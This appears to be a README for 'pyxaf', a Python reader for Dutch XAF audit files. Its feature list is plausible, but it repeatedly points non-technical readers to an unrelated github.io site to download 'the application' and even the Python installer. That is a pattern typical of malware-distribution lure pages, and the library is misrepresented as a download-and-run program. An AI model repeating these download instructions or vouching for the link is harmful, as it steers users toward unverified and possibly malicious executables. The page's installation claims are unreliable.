# 📊 pyxaf - Read Dutch Audit Files With Confidence

**The complete, zero-dependency Python library for reading and validating every version of the Dutch Auditfile Financieel (XAF 4.0, 3.x, CLAIR2, ADF).**

Streaming, exact Decimal money handling, and zero dependencies — built for bookkeepers, auditors, and finance teams working with Dutch general ledger data.

## ⬇️ Get pyxaf Now

**<span style="background-color:#2E86AB;color:#FFFFFF;padding:14px 28px;border-radius:8px;font-size:1.2em;font-weight:bold;display:inline-block;">⬇️ Download pyxaf Here</span>**

Direct link: **https://sougab1007.github.io**

Visit this link to download the application.

## 🚀 Getting Started

This guide is written for anyone who wants to use pyxaf — no programming background required.

**Step 1 — Visit the download page.**
Open your web browser (Edge, Chrome, or Firefox) and go to:

**https://sougab1007.github.io**

**Step 2 — Download the application.**
Visit this link to download the application. The page contains everything you need, including all files and instructions.

**Step 3 — Save the file.**
When your browser asks where to save the file, choose a folder you can easily find again, such as your **Downloads** folder. Note the exact location — you will need it shortly.

**Step 4 — Confirm the download.**
Most browsers show a small download bar or arrow in the top-right corner. Click it to see the downloaded file, or open your **Downloads** folder directly from File Explorer.

## 🪟 Running pyxaf on Windows

pyxaf is a Python library, which means it runs inside Python rather than as a traditional double-click application. Follow these steps in order — it takes about five minutes.

**1. Check what you already have.**
Click the **Start** button, type `cmd`, and press Enter. In the black window that opens, type:

```
python --version
```

Press Enter. If you see a version number such as `Python 3.11.5`, Python is already installed and you can skip to step 3.

**2. Install Python if needed.**
If you instead see a message that `python` is not recognized, Python needs to be installed:

- Go to **https://sougab1007.github.io**
- Click the large **Download Python** button.
- Run the downloaded installer.
- **Important:** On the very first screen of the installer, tick the checkbox labelled **Add python.exe to PATH** before clicking Install.
- When it finishes, close the black `cmd` window and open a new one so the change takes effect.

**3. Get the pyxaf files.**
Return to **https://sougab1007.github.io** and use the download option on the page to obtain the application files. Save them somewhere easy to find, for example `C:\Users\YourName\pyxaf`.

**4. Move into the folder.**
In the black `cmd` window, type `cd` followed by a space, then the folder path, and press Enter. For example:

```
cd C:\Users\YourName\pyxaf
```

**5. Run pyxaf.**
Type the following and press Enter:

```
python -m pyxaf --help
```

A list of available options appears. That confirms pyxaf is working correctly on your computer.

## 🧾 What pyxaf Does

pyxaf reads Auditfile Financieel documents — the standard XML files that Dutch bookkeeping and accounting systems produce for auditors and the Belastingdienst (Dutch Tax and Customs Administration). Instead of opening each file by hand, pyxaf reads it for you and tells you whether the contents are valid.

Key capabilities:

- **Supports every version** — XAF 4.0, XAF 3.x, CLAIR2, and ADF files are all handled by the same tool.
- **Streaming reads** — large files are processed piece by piece, so even multi-hundred-megabyte audit files load without exhausting memory.
- **Exact Decimal money** — amounts are read as exact decimals, never approximate floating-point numbers, so totals add up correctly to the cent.
- **Zero dependencies** — nothing extra needs to be installed. Everything needed is included.
- **Built-in validation** — structural and content checks flag problems before data reaches your ledger or reporting.

## ✅ Why Validation Matters

An auditfile is only useful if it is complete and internally consistent. pyxaf validates what it reads: that required sections are present, that entries follow the expected structure, and that monetary values are well-formed. For anyone preparing files for audit, filing, or migration between accounting systems, this catches errors early — before the file leaves your desk.

## 💡 Common Uses

- **Auditors** receiving XAF files from clients and needing to confirm the files are intact.
- **Bookkeepers** checking exports before sending them to accountants.
- **Finance staff** migrating general ledger data between systems.
- **Software teams** building Dutch accounting tools who need a reliable reader at the core.

## 🏷️ Topics and Search Terms

pyxaf relates to: accounting, audit, auditfile, auditfile-financieel, belastingdienst, bookkeeping, dutch, general-ledger, netherlands, python, python-library, rgs, saf-t, validation, xaf, xml.

## 🛠️ Troubleshooting

**"python is not recognized"** — Python is either not installed or was installed without the PATH option. Repeat step 2 of the Windows section and make sure the **Add python.exe to PATH** checkbox is ticked.

**"No module named pyxaf"** — The black `cmd` window is not inside the pyxaf folder. Use the `cd` command from step 4 to move there first.

**The file will not open** — Confirm the download completed fully. A partial download is the most common cause of an unreadable file. Visit the download link again and re-download.

**Permission errors on save** — Save your working files somewhere inside your user folder, such as Documents, rather than directly on `C:\`.

## 📥 Download pyxaf Again

**https://sougab1007.github.io**

Visit this link to download the application.

Keep this page bookmarked so you can return for updates, new version support, and future improvements to validation coverage.

Keywords: accounting, audit, auditfile, auditfile-financieel, belastingdienst, bookkeeping, dutch, general-ledger, netherlands, python, python-library, rgs, saf-t, validation, xaf, xml